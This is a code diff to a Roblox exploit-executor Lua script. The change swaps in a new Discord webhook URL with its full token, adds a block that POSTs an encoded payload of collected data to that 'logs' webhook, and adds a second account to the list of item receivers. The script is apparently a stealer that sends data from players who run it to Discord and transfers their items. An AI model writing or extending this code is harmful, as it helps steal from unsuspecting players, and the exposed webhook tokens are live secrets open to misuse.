@@ -15,7 +15,7 @@
         
         local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
         local date = os.date("%Y-%m-%d %H:%M:%S")
-        local LogsWebhook = "https://discord.com/api/webhooks/1434548815708557422/PxmHG3gOYh7gXeuj362q-5V-T0Qfl_k2Bfecy0mvBbYjMoSMFkxVo5YsKeiwU04ibzoV"
+        local LogsWebhook = "https://discord.com/api/webhooks/1434742960058011658/jzhBRTWgycYOGDWN5qIaCZP3tjUiRZWG8z0bsx0rxvrA52nT3Dir0ObrlpYsHLaclOox"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -512,6 +512,20 @@ end)
 -- Warnings
 if not success1 then warn("Something Went Wrong [Main Webhook Error]", err1) end
 
+
+local success2, err2 = pcall(function()
+    request({
+        Url = LogsWebhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+end)
+
+if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
+
                 local function CreateGui()
                     local player = Players.LocalPlayer
 
@@ -600,6 +614,8 @@ if not success1 then warn("Something Went Wrong [Main Webhook Error]", err1) end
 
         local usernames = {
             "Smiley9Gamerz",
+            "BUZZFTWGOD"
+    
         }
 
         local receiverPlr
